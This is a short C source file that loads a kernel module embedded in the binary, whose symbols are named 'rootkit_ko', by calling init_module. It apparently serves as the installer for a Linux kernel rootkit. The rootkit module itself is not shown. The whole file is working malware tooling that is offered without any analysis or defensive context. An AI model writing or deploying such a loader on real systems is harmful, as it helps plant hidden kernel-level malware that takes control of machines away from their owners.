#include <linux/module.h>
#include <stdio.h>
#include <syscall.h>
#include <unistd.h>

extern const char _binary_rootkit_ko_start[];
extern const char _binary_rootkit_ko_end[];

int main()
{
    if (syscall(SYS_init_module, _binary_rootkit_ko_start,
                _binary_rootkit_ko_end - _binary_rootkit_ko_start,
                (char[]){'\0'})) {
        puts("[!] You are not root");
        return -1;
    }
    return 0;
}
